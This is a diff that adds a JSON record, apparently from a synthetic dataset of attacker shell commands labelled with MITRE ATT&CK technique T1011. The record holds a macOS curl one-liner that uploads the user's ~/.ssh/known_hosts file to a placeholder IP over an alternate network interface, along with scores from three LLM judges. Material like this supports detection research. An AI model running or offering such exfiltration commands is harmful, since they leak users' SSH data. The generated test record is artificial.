@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
+  "explanation": "Performs HTTPS exfiltration by binding curl to a USB Ethernet adapter interface, leveraging a non-primary medium (T1011).",
+  "rationale_steps": [
+    "Retrieve USB Ethernet IP via networksetup",
+    "Bind HTTP client to that alternate medium",
+    "Transmit data to an uncommon TLS port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f7f3a725",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid flags for curl, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration over HTTPS, it doesn't align with T1011 (Exfiltration Over Other Network Medium) as claimed because using a USB Ethernet adapter is still using the standard TCP/IP stack rather than an alternate protocol or medium like Bluetooth or cellular.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:31:17.315651Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitution, and proper file path and URL syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration using a specific network interface, which is operationally plausible; however, its action is completely misaligned with the described MITRE ATT&CK technique T1011 (Establish Accounts), instead being a clear exfiltration technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:31:24.640954Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid curl flags, and a correct command substitution pipeline.",
+        "semantic_score": 3,
+        "semantic_justification": "It attempts HTTPS exfiltration bound to a USB Ethernet IP (aligning with exfil over a non-primary medium), but practical success is doubtful due to use of a documentation-only IP and likely TLS cert mismatch unless -k or a proper IP SAN cert is present.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T10:31:45.188564Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
